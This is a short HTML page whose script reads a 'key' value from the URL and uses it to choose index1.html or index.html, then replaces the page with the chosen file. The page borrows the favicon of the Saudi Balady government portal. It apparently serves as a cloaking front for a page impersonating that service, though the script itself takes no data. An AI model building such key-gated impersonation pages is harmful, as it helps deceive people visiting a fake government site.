<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <link rel="icon" type="image/x-icon" href="https://apps.balady.gov.sa/BALADYCDN/Content/images/fav.ico">
</head>
<body>
<script>
(function() {
    // قراءة الـ URL بكل الطرق الممكنة
    const fullURL = window.location.href;
    const params = new URLSearchParams(window.location.search);
    const path = window.location.pathname;
    
    console.log('Full URL:', fullURL);
    console.log('Path:', path);
    console.log('Search params:', window.location.search);
    
    // جلب الـ key من الـ URL
    let key = params.get('key');
    
    // إذا مافيش key في الـ search params، جرب تجيبه من الـ URL نفسه
    if (!key) {
        const keyMatch = fullURL.match(/[?&]key=([^&]+)/);
        if (keyMatch) {
            key = keyMatch[1];
        }
    }
    
    // أو جرب تجيبه من الـ hash إذا كان موجود
    if (!key && window.location.hash) {
        const hashParams = new URLSearchParams(window.location.hash.replace('#', ''));
        key = hashParams.get('key');
    }
    
    console.log('Key found:', key);
    
    // جدول التوجيه
    const routes = {
        '7e46a31919881b2bf3e5d5ca6f600000': '/index1.html',
        '5047665a19881b2a74ff415dd6c00000': '/index.html'
    };
    
    // تحديد الملف المطلوب
    let targetFile = '/index.html'; // default
    
    if (key && routes[key]) {
        targetFile = routes[key];
        console.log('Target file selected:', targetFile);
    } else {
        console.log('Using default file:', targetFile);
        console.log('Available keys:', Object.keys(routes));
    }
    
    // تحميل الملف المطلوب فوراً
    fetch(targetFile)
        .then(r => {
            if (!r.ok) {
                throw new Error(`HTTP ${r.status}`);
            }
            return r.text();
        })
        .then(html => {
            document.open();
            document.write(html);
            document.close();
        })
        .catch(error => {
            console.error('Error loading file:', error);
            // في حالة الخطأ، حاول تحمل index.html
            if (targetFile !== '/index.html') {
                fetch('/index.html')
                    .then(r => r.text())
                    .then(html => {
                        document.open();
                        document.write(html);
                        document.close();
                    })
                    .catch(() => window.location.href = '/');
            } else {
                window.location.href = '/';
            }
        });
})();
</script>
</body>
</html>